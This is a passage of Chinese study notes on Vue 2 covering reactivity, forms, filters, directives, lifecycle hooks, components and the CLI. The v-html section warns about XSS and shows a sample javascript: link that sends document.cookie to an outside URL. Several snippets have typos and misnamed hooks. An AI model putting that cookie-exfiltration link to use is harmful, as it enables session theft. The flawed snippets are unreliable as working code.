		data: {
			persons: [
				{ id: '001', name: '张三', age: 18 },
				{ id: '002', name: '李四', age: 19 },
				{ id: '003', name: '王五', age: 20 }
			]
		},
		methods: {
			add() {
				const p = { id: '004', name: '老刘', age: 40 }
				this.persons.unshift(p)
			}
		},
	})
</script>
```

#### 列表过滤

人员列表

使用watch实现

```javascript
<div id="root">
	<h2>人员列表</h2>
	<input type="text" placeholder="请输入名字" v-model="keyWord">
	<ul>
		<li v-for="(p,index) of filPerons" :key="index">
			{{p.name}}-{{p.age}}-{{p.sex}}
		</li>
	</ul>
</div
<script type="text/javascript">
	Vue.config.productionTip = false
	
	//用watch实现
	//#region 
	new Vue({
		el:'#root',
		data:{
			keyWord:'',
			persons:[
				{id:'001',name:'马冬梅',age:19,sex:'女'},
				{id:'002',name:'周冬雨',age:20,sex:'女'},
				{id:'003',name:'周杰伦',age:21,sex:'男'},
				{id:'004',name:'温兆伦',age:22,sex:'男'}
			],
			filPerons:[]
		},
		watch:{
			keyWord:{
				immediate:true,
				handler(val){
					this.filPerons = this.persons.filter((p)=>{
						return p.name.indexOf(val) !== -1
					})
				}
			}
		}
	}) 
```

使用computed实现

```javascript
new Vue({
	el:'#root',
	data:{
		keyWord:'',
		persons:[
			{id:'001',name:'马冬梅',age:19,sex:'女'},
			{id:'002',name:'周冬雨',age:20,sex:'女'},
			{id:'003',name:'周杰伦',age:21,sex:'男'},
			{id:'004',name:'温兆伦',age:22,sex:'男'}
		]
	},
	computed:{
		filPerons(){
			return this.persons.filter((p)=>{
				return p.name.indexOf(this.keyWord) !== -1
			})
		}
	}
}) 
```

#### 列表排序

```javascript
<div id="root">
	<h2>人员列表</h2>
	<input type="text" placeholder="请输入名字" v-model="keyWord">
	<button @click="sortType = 2">年龄升序</button>
	<button @click="sortType = 1">年龄降序</button>
	<button @click="sortType = 0">原顺序</button>
	<ul>
		<li v-for="(p,index) of filPerons" :key="p.id">
			{{p.name}}-{{p.age}}-{{p.sex}}
			<input type="text">
		</li>
	</ul>
</div>
<script type="text/javascript">
	Vue.config.productionTip = false
	new Vue({
		el:'#root',
		data:{
			keyWord:'',
			sortType:0, //0原顺序 1降序 2升序
			persons:[
				{id:'001',name:'马冬梅',age:30,sex:'女'},
				{id:'002',name:'周冬雨',age:31,sex:'女'},
				{id:'003',name:'周杰伦',age:18,sex:'男'},
				{id:'004',name:'温兆伦',age:19,sex:'男'}
			]
		},
		computed:{
			filPerons(){
				const arr = this.persons.filter((p)=>{
					return p.name.indexOf(this.keyWord) !== -1
				})
				//判断一下是否需要排序
				if(this.sortType){
					arr.sort((p1,p2)=>{
						return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
					})
				}
				return arr
			}
		}
	}) 
</script
```

#### 更新数据的问题

```javascript
<div id="root">
	<h2>人员列表</h2>
	<button @click="updateMei">更新马冬梅的信息</button>
	<ul>
		<li v-for="(p,index) of persons" :key="p.id">
			{{p.name}}-{{p.age}}-{{p.sex}}
		</li>
	</ul>
</div>
<script type="text/javascript">
	Vue.config.productionTip = false
	const vm = new Vue({
		el:'#root',
		data:{
			persons:[
				{id:'001',name:'马冬梅',age:30,sex:'女'},
				{id:'002',name:'周冬雨',age:31,sex:'女'},
				{id:'003',name:'周杰伦',age:18,sex:'男'},
				{id:'004',name:'温兆伦',age:19,sex:'男'}
			]
		},
		methods: {
			updateMei(){
				// this.persons[0].name = '马老师' //奏效
				// this.persons[0].age = 50 //奏效
				// this.persons[0].sex = '男' //奏效
				// this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
				this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
			}
		}
	}) 
</script>
```

#### 模拟一个数据监测

```javascript
<script type="text/javascript">
  let data = {
    name: "尚硅谷",
    address: "北京",
  };
  //创建一个监视的实例对象，用于监视data中属性的变化
  const obs = new Observer(data);
  console.log(obs);
  //准备一个vm实例对象
  let vm = {};
  vm._data = data = obs;
  function Observer(obj) {
    //汇总对象中所有的属性形成一个数组
    const keys = Object.keys(obj);
    //遍历
    keys.forEach(k => {
      Object.defineProperty(this, k, {
        get() {
          return obj[k];
        },
        set(val) {
          console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`);
          obj[k] = val;
        },
      });
    });
  }
</script>
```

#### set的使用

vm.$set或者Vue.set是一样的

```javascript
  Vue.config.productionTip = false; //阻止 vue 在启动时生成生产提示。
  const vm = new Vue({
    el: "#root",
    data: {
      school: {
        name: "尚硅谷",
        address: "北京",
      },
      student: {
        name: "tom",
        age: {
          rAge: 40,
          sAge: 29,
        },
        friends: [
          { name: "jerry", age: 35 },
          { name: "tony", age: 36 },
        ],
      },
    },
    methods: {
      addSex() {
        // Vue.set(this.student,'sex','男')
        this.$set(this.student, "sex", "男");
      },
    },
  });
```

#### Vue检测数据的原理

vue会监视data中所有层次的数据

##### 如何检测对象中的数据

 通过setter实现监视，且要在new Vue时就传入要监测的数据。

  (1).对象中后追加的属性，Vue默认不做响应式处理

  (2).如需给后添加的属性做响应式，请使用如下API

1. Vue.set(target，propertyName/index，value) 
2. vm.$set(target，propertyName/index，value)

```javascript
  <div id="root">
    <h1>学校信息</h1>
    <h2>学校名称：{{school.name}}</h2>
    <h2>学校地址：{{school.address}}</h2>
    <h2>校长是：{{school.leader}}</h2>
    <hr />
    <h1>学生信息</h1>
    <button @click="addSex">添加一个性别属性，默认值是男</button>
    <h2>姓名：{{student.name}}</h2>
    <h2 v-if="student.sex">性别：{{student.sex}}</h2>
    <h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
    <h2>朋友们</h2>
    <ul>
      <li v-for="(f,index) in student.friends" :key="index">{{f.name}}--{{f.age}}</li>
    </ul>
  </div>
</body>
<script type="text/javascript">
  Vue.config.productionTip = false; //阻止 vue 在启动时生成生产提示。
  const vm = new Vue({
    el: "#root",
    data: {
      school: {
        name: "尚硅谷",
        address: "北京",
      },
      student: {
        name: "tom",
        age: {
          rAge: 40,
          sAge: 29,
        },
        friends: [
          { name: "jerry", age: 35 },
          { name: "tony", age: 36 },
        ],
      },
    },
    methods: {
      addSex() {
        // Vue.set(this.student,'sex','男')
        this.$set(this.student, "sex", "男");
      },
    },
  });
</script>
```

##### 如何监测数组中的数据

**通过包裹数组更新元素的方法实现**，本质就是做了两件事

1.   调用原生对应的方法对数组进行更新。
2.   重新解析模板，进而更新页面

在Vue修改数组中的某个元素一定要用如下方法：

1.  使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
2.  Vue.set() 或 vm.$set()

##### 总结Vue数据检测

```javascript
<body>
 <div id="root">
    <h1>学生信息</h1>
    <button @click="student.age++">年龄+1岁</button> <br />
    <button @click="addSex">添加性别属性，默认值：男</button> <br />
    <button @click="student.sex = '未知' ">修改性别</button> <br />
    <button @click="addFriend">在列表首位添加一个朋友</button> <br />
    <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br />
    <button @click="addHobby">添加一个爱好</button> <br />
    <button @click="updateHobby">修改第一个爱好为：开车</button> <br />
    <button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br />
    <h3>姓名：{{student.name}}</h3>
    <h3>年龄：{{student.age}}</h3>
    <h3 v-if="student.sex">性别：{{student.sex}}</h3>
    <h3>爱好：</h3>
    <ul>
      <li v-for="(h,index) in student.hobby" :key="index">{{h}}</li>
    </ul>
    <h3>朋友们：</h3>
    <ul>
      <li v-for="(f,index) in student.friends" :key="index">{{f.name}}--{{f.age}}</li>
    </ul>
  </div>
</body
<script type="text/javascript">
  Vue.config.productionTip = false; //阻止 vue 在启动时生成生产提示。
  const vm = new Vue({
    el: "#root",
    data: {
      student: {
        name: "tom",
        age: 18,
        hobby: ["抽烟", "喝酒", "烫头"],
        friends: [
          { name: "jerry", age: 35 },
          { name: "tony", age: 36 },
        ],
      },
    },
    methods: {
      addSex() {
        // Vue.set(this.student,'sex','男')
        this.$set(this.student, "sex", "男");
      },
      addFriend() {
        this.student.friends.unshift({ name: "jack", age: 70 });
      },
      updateFirstFriendName() {
        this.student.friends[0].name = "张三";
      },
      addHobby() {
        this.student.hobby.push("学习");
      },
      updateHobby() {
        // this.student.hobby.splice(0,1,'开车')
        // Vue.set(this.student.hobby,0,'开车')
        this.$set(this.student.hobby, 0, "开车");
      },
      removeSmoke() {
        this.student.hobby = this.student.hobby.filter(h => {
          return h !== "抽烟";
        });
      },
    },
  });
</script>
```

### 收集表单数据

#### text

`<input type="text"/>`，则v-model收集的是value值，用户输入的就是value值

#### radio

`<input type="radio"/>`，则v-model收集的是value值，且要给标签配置value值

#### checkbox

`<input type="checkbox"/>`

1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）

2.配置input的value属性:

  (1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）

  (2)v-model的初始值是数组，那么收集的的就是value组成的数组

#### v-model修饰符

lazy：失去焦点再收集数据

number：输入字符串转为有效的数字

trim：输入首尾空格过滤

下面案例是整体使用

```javascript
<div id="root">
  <form @submit.prevent="demo">
    账号：<input type="text" v-model.trim="userInfo.account" /> <br /><br />
    密码：<input type="password" v-model="userInfo.password" /> <br /><br />
    年龄：<input type="number" v-model.number="userInfo.age" /> <br /><br />
    性别： 男<input type="radio" name="sex" v-model="userInfo.sex" value="male" /> 女<input
      type="radio"
      name="sex"
      v-model="userInfo.sex"
      value="female"
    />
    <br /><br />
    爱好： 学习<input type="checkbox" v-model="userInfo.hobby" value="study" /> 打游戏<input
      type="checkbox"
      v-model="userInfo.hobby"
      value="game"
    />
    吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat" /> <br /><br />
    所属校区
    <select v-model="userInfo.city">
      <option value="">请选择校区</option>
      <option value="beijing">北京</option>
      <option value="shanghai">上海</option>
      <option value="shenzhen">深圳</option>
      <option value="wuhan">武汉</option>
    </select>
    <br /><br />
    其他信息：
    <textarea v-model.lazy="userInfo.other"></textarea> <br /><br />
    <input type="checkbox" v-model="userInfo.agree" />阅读并接受<a href="http://www.atguigu.com"
      >《用户协议》</a
    >
    <button>提交</button>
  </form>
</div>
<script type="text/javascript">
  Vue.config.productionTip = false;
  new Vue({
    el: "#root",
    data: {
      userInfo: {
        account: "",
        password: "",
        age: 18,
        sex: "female",
        hobby: [],
        city: "beijing",
        other: "",
        agree: "",
      },
    },
    methods: {
      demo() {
        console.log(JSON.stringify(this.userInfo));
      },
    },
  });
</script>
```

### 过滤器

对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）

#### filters

注册过滤器`new Vue{filters:{  }}`

```javascript
<div id="root2">
  <h2>{{msg | mySlice}}</h2>
  <h2>{{msg | changeMsg}}</h2>
</div>
<script>
  new Vue({
    el: "#root2",
    data: {
      msg: "hello,后盾人!",
    },
    filters: {
      changeMsg(value) {
        return value + ".com";
      },
    },
  });
<scritp>
```

#### 使用过滤器

使用过滤器：{{ xxx | 过滤器名}} 或 v-bind:属性 = "xxx | 过滤器名"

```javascript
<h2>{{msg | changeMsg}}</h2>
<h3 :x="msg | mySlice">后盾人</h3>
```

#### 注意点

1. 过滤器也可以接收额外参数、多个过滤器也可以串联
2. 并没有改变原本的数据, 是产生新的对应的数据

```javascript
<div id="root">
  <h2>显示格式化后的时间</h2>
  <!-- 计算属性实现 -->
  <h3>现在是：{{fmtTime}}</h3>
  <!-- methods实现 -->
  <h3>现在是：{{getFmtTime()}}</h3>
  <!-- 过滤器实现 -->
  <h3>现在是：{{time | timeFormater}}</h3>
  <!-- 过滤器实现（传参） -->
  <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
  <h3 :x="msg | mySlice">尚硅谷</h3>
</div>
<script type="text/javascript">
  Vue.config.productionTip = false;
  //全局过滤器
  Vue.filter("mySlice", function (value) {
    return value.slice(0, 4);
  })
  new Vue({
    el: "#root",
    data: {
      time: 1621561377603, //时间戳
      msg: "你好，尚硅谷",
    },
    computed: {
      fmtTime() {
        return dayjs(this.time).format("YYYY年MM月DD日 HH:mm:ss");
      },
    },
    methods: {
      getFmtTime() {
        return dayjs(this.time).format("YYYY年MM月DD日 HH:mm:ss");
      },
    },
    //局部过滤器
    filters: {
      timeFormater(value, str = "YYYY年MM月DD日 HH:mm:ss") {
        // console.log('@',value)
        return dayjs(value).format(str);
      },
    },
  });
</script>
```

### 内置指令

#### v-text

向其所在的节点中渲染文本内容

与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会

```javascript
<div id="root">
    <div>你好，{{name}}</div>
    <div v-text="name"></div>
    <div v-text="str"></div>
  </div>
</body>
<script type="text/javascript">
  Vue.config.productionTip = false; //阻止 vue 在启动时生成生产提示。
  new Vue({
    el: "#root",
    data: {
      name: "尚硅谷",
      str: "<h3>你好啊！</h3>",
    },
  });
</script>
```

#### v-html

向指定节点中渲染包含html结构的内容

与插值语法的区别：

​	(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。

​	(2).v-html可以识别html结构。*

**注意：**

​    (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。

​    (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上

```javascript
<div id="root">
  <div>你好，{{name}}</div>
  <div v-html="str"></div>
  <div v-html="str2"></div>
</div>
<script type="text/javascript">
  Vue.config.productionTip = false; //阻止 vue 在启动时生成生产提示
  new Vue({
    el: "#root",
    data: {
      name: "尚硅谷",
      str: "<h3>你好啊！</h3>",
        str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
      },
    });
</script>
```

#### cookie

有时候，服务器需要保存用户的信息，这些信息最好放在用户的电脑上，并能够让服务器获取。例如自动登录功能的实现，需要将用户名和密码保存在本地，下次访问网站时，再将用户名和密码发送到服务器进行验证，验证通过后自动登录，否则不能登录。

这些服务器在用户电脑上保存的信息，就叫 cookie 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210825083926928.png" alt="image-20210825083926928" style="zoom:50%;" />

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210825083951338.png" alt="image-20210825083951338" style="zoom:50%;" />

#### v-cloack

本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性

使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

```javascript
<style>
  [v-cloak] {
    display: none;
  }
</style>
</head>
<body>
  <div id="root">
    <h2 v-cloak>{{name}}</h2>
  </div>
  <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
</body>
<script type="text/javascript">
  console.log(1);
  Vue.config.productionTip = false; //阻止 vue 在启动时生成生产提示
  new Vue({
    el: "#root",
    data: {
      name: "尚硅谷",
    },
  });
</script>
```

#### v-once

v-once所在节点在初次动态渲染后，就视为静态内容了。

以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```javascript
<div id="root">
  <h2 v-once>初始化的n值是:{{n}}</h2>
  <h2>当前的n值是:{{n}}</h2>
  <button @click="n++">点我n+1</button>
</div>
<script type="text/javascript">
 Vue.config.productionTip = false; //阻止 vue 在启动时生成生产提示。
 new Vue({
   el: "#root",
   data: {
     n: 1,
   },
 });
</script>
```

#### v-pre

跳过其所在节点的编译过程。

可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

```javascript
<div id="root">
  <h2 v-pre>Vue其实很简单</h2>
  <h2>当前的n值是:{{n}}</h2>
  <button @click="n++">点我n+1</button>
</div>
<script type="text/javascript">
  Vue.config.productionTip = false; //阻止 vue 在启动时生成生产提示。
  new Vue({
    el: "#root",
    data: {
      n: 1,
    },
  });
</script>
```

### 自定义指令

除了使用内置指令之外还可以自己设置自定义的指令

#### directives

设置自定义指令需要在vue实例中添加directives配置项，可以写成函数或者对象

注意配置对象中的this属于是window

#### 配置函数

如果配置项是函数，那么可以接收到两个值，第一个是元素本身，第二个是绑定的值

下面是配置对象的例

```javascript
<div id="root">
  <h2>{{name}}</h2>
  <h2>当前的n值是：<span v-text="n"></span></h2>
  <h2>放大10倍后的n值是：<span v-big="n"></span></h2>
  <button @click="n++">点我n+1</button>
  <hr />
</div>
<script>
  new Vue({
    el: "#root",
    data: {
      name: "尚硅谷",
      n: 1,
    },
    directives: {
      //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
      big(element, binding) {
        console.log("big", this); //注意此处的this是window
        element.innerText = binding.value * 10;
      }
    },
  });
</script>
```

#### 配置对象

配置对象里面一般是有3个回调函数

1. bind：指令与元素成功绑定时调用。
2. inserted：指令所在元素被插入页面时调用。
3. update：指令所在模板结构被重新解析时调用

```javascript
<div id="root">
  <input type="text" v-fbind:value="n" />
</div>
<script>
  new Vue({
    el: "#root",
    data: {
      name: "尚硅谷",
      n: 1,
    },
    directives: {
      //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
	fbind: {
      //指令与元素成功绑定时（一上来）
      bind(element, binding) {
        element.value = binding.value;
      },
      //指令所在元素被插入页面时
      inserted(element, binding) {
        element.focus();
      },
      //指令所在的模板被重新解析时
      update(element, binding) {
        element.value = binding.value;
      },
     },
    },
  });
</script>
```

#### 注意点

1. 指令定义时不加v-，但使用时要加v-；
2. 指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。

```javascript
<h2>放大10倍后的n值是：<span v-big-number="n"></span></h2>
<script>
  new Vue({
  el: "#root",
  data: {
    name: "尚硅谷",
    n: 1,
  },
  directives: {
    "big-number"(element, binding) {
      element.innerText = binding.value * 10;
    }
  },
    });
</script>
```

#### 全局自定义属性

全局定义可以定义Vue上

```javascript
Vue.directive('fbind',{
	//指令与元素成功绑定时（一上来）
	bind(element,binding){
		element.value = binding.value
	},
	//指令所在元素被插入页面时
	inserted(element,binding){
		element.focus()
	},
	//指令所在的模板被重新解析时
	update(element,binding){
		element.value = binding.value
	}
})
```

### 生命周期

1. 定义：Vue在关键时刻帮我们调用的一些特殊名称的函数
2. 又名：生命周期回调函数、生命周期函数、生命周期钩子
3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的
4. 生命周期函数中的this指向是 vm  或者  组件实例对象

#### mounted

Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted生命周期函数

下面是使用mounted函数操作文字淡出淡去的效果

```javascript
<body>
  <div id="app">
    <h2 :style="{opacity}">{{ name }}</h2>
    <h2>{{ site }}</h2>
  </div>
</body>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#app",
    data: {
      name: "houdunren.com",
      opacity: 1,
      site: "hdcms.com",
    },
    mounted() {
      console.log("挂载成功执行一次");
      setInterval(() => {
        this.opacity -= 0.01;
        if (this.opacity <= 0) this.opacity = 1;
      }, 16);
    },
  });
</script>
```

#### 生命周期图示

![image-20210825143841277](https://i.loli.net/2021/08/25/DvOYETbKFqQem57.png)

#### 常用的生命周期钩子

mounted：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】

beforeDestroy：清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】

#### 关于销毁Vue实例

1. 销毁后借助Vue开发者工具看不到任何信息
2. 销毁后自定义事件会失效，但原生的DOM事件依然有效
3. 一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了

下面是生命周期的钩子函数

```javascript
<body>
  <div id="app" :x="n">
    <h2>n的值是：{{ n }}</h2>
    <button @click="change">点击n加一</button>
    <h2>{{ name }}</h2>
  </div>
</body>
<script>
  Vue.config.productionTip = false;
  const vm = new Vue({
    el: "#app",
    data: {
      n: 1,
      name: "后盾人",
    },
    methods: {
      change() {
        this.n++;
      },
    },
    beforeCreate() {
      console.log("beforeCreate");
    },
    created() {
      console.log("created");
    },
    beforeMount() {
      console.log("beforeMount");
    },
    mounted() {
      console.log("mounted");
    },
    beforeUpdate(){
	  console.log('beforeUpdate')
    },
    Updated(){
	  console.log('Updated')
    },
    beforeDestroy(){
      console.log('beforeDestroy')  
  	},
    destroy(){
      console.log('destroy')  
  	}
  });
</script>
```

下面的案例中有vm被销毁的过程

```javascript
<body>
  <div id="app">
    <h2 :style="{opacity}">{{ name }}</h2>
    <button @click="stop">点击销毁</button>
  </div>
</body>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#app",
    data: {
      name: "houdunren.com",
      opacity: 1,
    },
    methods: {
      stop() {
        this.$destroy();
      },
    },
    mounted() {
      console.log("mounted");
      this.timer = setInterval(() => {
        console.log("1");
        this.opacity -= 0.01;
        if (this.opacity <= 0) this.opacity = 1;
      }, 16);
    },
    beforeDestroy() {
      console.log("vm即将被销毁");
      clearInterval(this.timer);
    },
  });
</script>
```

### 组件化编程

#### 模块化与组件化

##### 传统方式

![image-20210826085351825](https://i.loli.net/2021/08/26/qdsO37TLjpzEWIA.png)

##### 组件化方式

![image-20210826085438052](https://i.loli.net/2021/08/26/tGucJs4KCSq3gA8.png)

![image-20210826085503043](https://i.loli.net/2021/08/26/Ogr8SeZPMfVUKns.png)

##### 组件化的定义

**什么是组件**

组件的定义是实现应用中局部功能代码和资源的集合

作用：复用编码、简化项目编码、提高运行效率

**组件化**

当应用中的功能都是多组件的方式来编写的，那这个应用就是一个组件化的应用

#### 组件之间的通讯

![4be91ba8a7d84bcadf0853288d803aa.png](https://i.loli.net/2021/11/05/gUsMbk7NjwPBKx8.png)

![199c161bbfe04f39adc380d0fae0124.png](https://i.loli.net/2021/11/05/RdCWUg2pjtGcVAy.png)

### 非单文件组件

#### 基本使用

##### 创建组件

我们可以通过Vue身上的extend方法创建组件

注意注册组件的时候传入一个对象，对象中是有data的，但是这个data要写成函数的形式类似于对象工厂，return出数据对象

可以防止一个组件被多次使用的时候，存在一个数据的引用关系

el不需要写，最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器

```javascript
const hd = Vue.extend({
  data() {
    return {
      name: "后盾人",
    };
  },
});
```

##### 注册组件

注册组件的时候我们需要在vm上创建一个新的配置项叫做components

```javascript
new Vue({
  el: "#app",
  data: { msg: "hello" },
  // 第二部注册组件
  components: {
    school: school,
    student: student,
  	//简写school,student
  },
});
```

##### 使用组件

使用的时候直接在html结构中写入组件标签

```javascript
<div id="app">
  <school></school>
  <hr />
  <student></student>
  <hr />
</div>
```

##### 搭配使用

使用template可以配置组件结构

```javascript
<body>
  <div id="app">
    <school></school>
    <hr />
    <student></student>
    <hr />
  </div>
  <script>
    Vue.config.productionTip = false;
    //   第一步创建school组件
    const school = Vue.extend({
      template: `
          <div>
            <h2>学校名称：{{ school.name }}</h2>
            <h2>学校网站：{{ school.site }}</h2>
          </div>
      `,
      data() {
        return {
          school: {
            name: "后盾网",
            site: "http://houdunren.com",
          },
        };
      },
    });
    //   第一步创建school组件
    const student = Vue.extend({
      template: `
          <div>
            <h2>学生名称：{{ student.name }}</h2>
            <h2>学生年龄：{{ student.age }}</h2>
            <button @click="say">姓名</button>
          </div>
      `,
      data() {
        return {
          student: {
            name: "张三",
            age: 18,
          },
        };
      },
      methods: {
        say() {
          alert(this.student.name);
        },
    });
    Vue.component("hello", hello);
    new Vue({
      el: "#app",
      data: { msg: "hello" },
      // 第二部注册组件
      components: {
        school: school,
        student: student,
      },
    });
  </script>
</body>
```

##### 公用组件

```javascript
Vue.component(组件名, 创建的组件对象);
```

#### 注意点

##### 组件名

一个单词组成

1. 第一种写法（首字母小写）：school
2. 第二种写法（首字母小写）：School

多个单词组成

1. 第一种写法（kebab-case命名小写）：my-school
2. 第二种写法（CamelCase命名）：MySchool（需要Vue脚手架支持）

注册组件中的组件名需要和使用组件时的名同步

```javascript
new Vue({
  el: "#app",
  data: { msg: "欢迎来到后盾网" },
  components: {
    user: hd,
    User: hd,
    "user-info": hd,
    UserInfo: hd,//需要配合vue脚手架
  },
});
```

##### 组件标签

1. 第一种写法：`<school></school>`
2. 第二种写法：`<school/ >`

如果不是使用脚手架，那么`<school/ >`会导致后续的组件不能渲染

##### 创建组件

创建组件的时候可以用下面的简写形式

下面这种写法在注册组件的时候vue内部会进行判断看是否是通过Vue.extend创建的，不是的话会自动补上

```javascript
const hd = {
  template: `
    <div>
        <h2>姓名：{{ name }}</h2>    
        <h2>年龄：{{ age }}</h2>    
    </div>
  `,
  data() {
    return {
      name: "张三",
      age: "18岁",
    };
  },
};
```

### 组件嵌套

在正式开发中我们都创建一个app组件用于管理其他的子组件，如果两个组件之间有嵌套关系，那么要注意书写的位置顺序

```javascript
<body>
  <div id="root"></div>
</body>
<script>
  Vue.config.productionTip = false;
  //定义student组件
  const student = Vue.extend({
    name: "student",
    template: `
      <div id="#student">
          <h2>学生姓名：{{ name }}</h2>
          <h2>学生年龄：{{ age }}</h2>
      </div>
    `,
    data() {
      return {
        name: "张三",
        age: "18岁",
      };
    },
  });
  //定义school组件
  const school = Vue.extend({
    name: "school",
    template: `
      <div id="#school">
          <h2>学校名称：{{ name }}</h2>
          <a :href="site">学校网址：{{ site }}</a>
          <student></student>
      </div>
    `,
    data() {
      return {
        name: "后盾网",
        site: "http://houdunwang.com",
      };
    },
    components: {
      student,
    },
  });
  //定义hello组件
  const hello = Vue.extend({
    name: "hello",
    template: `<h1>{{ msg }}</h1>`,
    data() {
      return {
        msg: "欢迎来到后盾网",
      };
    },
  });
  // 定义app组件
  const app = Vue.extend({
    template: `
      <div id="#app">
          <hello></hello>    
          <school></school>    
      </div>
    `,
    name: "app",
    components: {
      school,
      hello,
    },
  });
  //创建vm实例
  new Vue({
    template: `<app></app>`,
    el: "#root",
    //注册组件
    components: {
      app,
    },
  });
</script>
```

### VueComponent

1. school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是调用Vue.extend方法生成的

2. 我们只需要写` <school />`或`<school></shcool>`,Vue解析模板时会帮我们创建school组件的实例对象

   即Vue帮我们执行`new VueComponent(options)`

```javascript
<body>
  <div id="root">
    <school></school>
  </div>
</body>
<script>
  Vue.config.productionTip = false;
  // 定义hello组件
  const hello = Vue.extend({
    template: `
      <h1>{{ msg }}</h1>
    `,
    data() {
      return {
        msg: "欢迎来到后盾网!",
      };
    },
  });
  // 定义school组件
  const school = Vue.extend({
    template: `
      <div>
        <hello></hello>
        <h2>学校名称：{{ name }}</h2>
        <h2>学校网址：{{ site }}</h2>
        <button @click="showName">提示姓名</button>
      </div>
    `,
    data() {
      return {
        name: "后盾人",
        site: "http://houdunren.com",
      };
    },
    methods: {
      showName() {
        //vc配置中的this指向的就是vc实例
        alert(this.name);
      },
    },
    //   在school中注册hello组件
    components: { hello },
  });
  //创建vm实例
  new Vue({
    el: "#root",
    components: { school },
  });
</script>
```

3. 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent
4. this指向
   - 组件配置：data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是 `Vuecomponent实例对象-vc`
   - new Vue配置：data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是`Vue实例对象-vm`
5. VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象），Vue的实例对象，是vm

#### 一个重要的内置关系

```javascript
VueComponent.prototype.__proto__=== Vue.prototype
```

作用是为了让组件实例对象可以访问到Vue原型上的属性和方法

![image-20210826163056727](https://i.loli.net/2021/08/26/LwmCYOIK4f3MlJc.png)

```javascript
<body>
  <div id="root">
    <school></school>
  </div>
</body>
<script>
  Vue.config.productionTip = false;
  const school = Vue.extend({
    template: `
        <div>
          <h2>姓名：{{ name }}</h2>    
          <h2>年龄：{{ age }}</h2>    
          <button @click="show">点击显示x的值</button>  <!-- houdunren.com -->
        </div>
      `,
    data() {
      return {
        name: "后盾人",
        age: "18",
      };
    },
    methods: {
      show() {
        alert(this.x);
      },
    },
  });
  const vm = new Vue({
    el: "#root",
    components: {
      school,
    },
  });
  console.log(school.prototype.__proto__ === vm.__proto__); //true
  vm.__proto__.x = "houdunren.com";
</script>
```

### 单文件组件

#### 基本使用

单文件组件，组件都是采用.vue的后缀，组件其中包括3个源标签 template script style

```vue
<template>
  <div class="show">
    <h2>学校名称：{{ name }}</h2>
    <h2>学校地址：{{ site }}</h2>
    <button @click="show">提示学校名称</button>
  </div>
</template>

<script>
export default {
  name: "School",
  data() {
    return {
      name: "后盾网",
      site: "http://houdunren.com",
    };
  },
  methods: {
    show() {
      alert(this.name);
    },
  },
};
</script>

<style>
.show {
  background: greenyellow;
}
</style>
```

## 脚手架

### 初始化脚手架

Vue脚手架是Vue官方提供的标准化开发工具（开发平台）

#### 具体步骤

1. 全局安装@vue/cli

```powershell
npm install -g @vue/cli
```

2. 切换到你要创建的项目目录，然后使用命令创建项目 xxx项目名称

```powershell
vue create xxx
```

3. 启动项目

```powershell
npm run serve

通常通过命令: npm run dev 来启动vue-cli项目。

可以通过关闭终端，或在终端里：Crtl+C 来停止 vue项目。
```

**备注**

如果出现下载缓慢可以配置npm淘宝镜像

```powershell
npm config set registry https://registry.npm.taobao.org
```

#### 模板项目的结构

![image-20210827110854046](https://i.loli.net/2021/08/27/tEIJ9h5eYBKrA84.png)![img](https://images2018.cnblogs.com/blog/982069/201808/982069-20180819212437589-2035595425.png)

#### Vue的不同版本

1. vue.js与vue.runtime.xxx.js的区别
   - vue.js是完整版的Vue，包含：核心功能+模板解析器
   - vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器
2. 因为vue.runtime.xxx.js没有模板解析器，所有不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容

![image-20210827111230689](https://i.loli.net/2021/08/27/MJIstga4H7WBYjO.png)

#### render

如果我们使用es6的模块化那么vue会自动引入不包括模板解析器版本的vue，所以我们需要用到render帮助我们来解析模板

```react
import Vue from "vue";
import App from "./App.vue";
Vue.config.productionTip = false;
new Vue({
  el: "#app",
  render: function(createElement) {
    return createElement(App);
  },
});
```

